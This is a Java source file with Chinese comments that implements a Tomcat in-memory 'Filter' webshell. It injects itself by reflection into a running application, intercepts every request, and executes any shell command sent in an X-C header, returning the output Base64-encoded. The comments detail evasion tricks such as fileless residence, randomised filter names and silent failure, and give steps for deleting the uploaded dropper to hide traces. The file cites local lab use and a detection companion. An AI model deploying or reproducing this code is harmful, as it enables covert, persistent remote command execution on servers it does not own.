import javax.servlet.*;
import javax.servlet.http.*;
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.deploy.FilterDef;
import org.apache.catalina.deploy.FilterMap;
import java.io.*;
import java.lang.reflect.*;
import java.util.*;

/**
 * Tomcat Filter 型内存马（完整实现 / 本地实验环境）
 *
 * ── 形态谱系（衔接 07 落地马）──
 *   落地马（文件态）→ 注入器执行 → Filter 内存马（无文件态）
 *   变体：Listener 型（ServletRequestListener 不占 Filter 链顺序）、Servlet 型、
 *         Valve 型（管道更深处、绕 Filter 链审计）、Connector 型（HTTP 协议层）。
 *
 * ── 注入方式 ──
 *   经反序列化 / JNDI / 初始 webshell 调用：FilterShell.inject(application)
 *   编译：javac -cp "$CATALINA_HOME/lib/servlet-api.jar:$CATALINA_HOME/lib/catalina.jar" FilterShell.java
 *   （Tomcat 9+ 时 FilterDef/FilterMap 位于 org.apache.tomcat.util.descriptor.web 包，需改 import）
 *
 * ── 免杀面 ──
 *   1) 无文件驻留：web.xml 无条目，部署描述符与运行态差集即检测面
 *   2) Filter 名随机化（反检测）：静态审计常见命名（cmdFilter 等）不命中
 *   3) 触发仅凭 Header X-C：URL 路径零特征，静态路由审计无果
 *   4) 命令执行与回显全部内存态，响应 Base64 包装（避免明文回显特征）
 *   5) 防重复注入 + 执行异常静默放行（业务链路不中断）
 *
 * ── 自删纪律（重要，勿在代码内自动删）──
 *   注入成功后落地引导马应立即手工删除（无文件态收尾），步骤：
 *     ① 确认注入生效：带 X-C 发一次请求，有 Base64 回显 = 内存马已接管
 *     ② 定位落地文件：find <webroot> -name '*.jsp' -mmin -30
 *     ③ 删除：只删自己上传的引导马，用可恢复方式（trash/回收站），删除前先备份
 *   不在代码内自动删除：删除文件 = 写盘行为 + 审计日志特征（检测点），且误删风险
 *   不可控；手工删可控、可核。
 *
 * 检测侧配对见 NOTES.md；仅本地实验环境使用
 */
public class FilterShell {

    /** 随机 Filter 名（反检测：无字典特征；长度贴近常规框架 Filter 命名） */
    private static String randomName() {
        return "x-" + Long.toHexString(System.nanoTime() & 0xFFFFFFFFL);
    }

    private static volatile boolean injected = false;   // 单容器演示防重复；多应用容器按
                                                        // Context 粒度维护集合（变体登记）

    /**
     * 注入入口：向运行中的 StandardContext 注册动态 Filter
     * @return true = 注入成功（或此前已注入）
     */
    public static synchronized boolean inject(ServletContext ctx) throws Exception {
        if (injected) return true;
        if (!(ctx instanceof StandardContext)) return false;    // 非 Tomcat 容器 → 放弃
        StandardContext sc = (StandardContext) ctx;
        String name = randomName();

        // ── 1) 执行体 Filter（匿名类，随注入一次性载入，无 jar 来源）──
        Filter f = new Filter() {
            public void init(FilterConfig fc) {}
            public void destroy() {}

            public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain)
                    throws IOException, ServletException {
                HttpServletRequest  r = (HttpServletRequest)  req;
                HttpServletResponse w = (HttpServletResponse) res;

                String cmd = r.getHeader("X-C");               // 触发仅凭 Header
                if (cmd == null) { chain.doFilter(req, res); return; }  // 正常业务放行

                try {
                    // 跨平台执行：Windows cmd.exe / Linux sh -c
                    boolean win = System.getProperty("os.name")
                                        .toLowerCase().contains("win");
                    Process p = new ProcessBuilder(
                            win ? "cmd.exe" : "/bin/sh",
                            win ? "/c" : "-c", cmd)
                            .redirectErrorStream(false).start();
                    // 变体登记：大输出场景改双线程并发读 stdout/stderr（防管道满死锁）
                    String out = read(p.getInputStream());
                    String err = read(p.getErrorStream());
                    p.waitFor();

                    // 响应包装：Base64 回显，避免明文命令结果出现在响应体（流量侧特征）
                    String body = Base64.getEncoder()
                                        .encodeToString(out.getBytes("UTF-8"));
                    if (!err.isEmpty())
                        body += "|" + Base64.getEncoder()
                                          .encodeToString(err.getBytes("UTF-8"));
                    w.getWriter().write(body);
                    return;                                    // 不进入后续链
                } catch (Exception ex) {
                    chain.doFilter(req, res);                  // 执行失败 → 静默放行
                }
            }

            private String read(InputStream in) throws IOException {
                ByteArrayOutputStream b = new ByteArrayOutputStream();
                byte[] buf = new byte[4096]; int n;
                while ((n = in.read(buf)) != -1) b.write(buf, 0, n);
                return b.toString("UTF-8");
            }
        };

        // ── 2) 注册三步（经典路线）──
        FilterDef def = new FilterDef();
        def.setFilterName(name);
        def.setFilterClass(f.getClass().getName());
        def.setFilter(f);
        sc.addFilterDef(def);                                  // ① 定义
        // 检测侧：addFilterDef/addFilterMap 调用是 RASP 动态注册遥测的挂点

        FilterMap map = new FilterMap();
        map.setFilterName(name);
        map.addURLPattern("/*");                               // ② 映射：全局劫持
        map.setDispatcher(DispatcherType.REQUEST.name());
        sc.addFilterMap(map);

        // ── 3) 反射插入 filterConfigs ──
        //    filterStart 已在容器启动时跑过——必须手工构造 ApplicationFilterConfig
        //    塞进 filterConfigs，否则新 FilterDef 不会进入过滤链。
        //    变体登记：容器启动早期可用简化路线 addFilter + filterStart()（会重建全部配置）
        Field fcfg = StandardContext.class.getDeclaredField("filterConfigs");
        fcfg.setAccessible(true);
        @SuppressWarnings("unchecked")
        Map<String, ApplicationFilterConfig> cfgs =
                (Map<String, ApplicationFilterConfig>) fcfg.get(sc);
        Constructor<ApplicationFilterConfig> ctor =
                ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
        ctor.setAccessible(true);
        cfgs.put(name, ctor.newInstance(sc, def));

        injected = true;
        return true;
    }
}
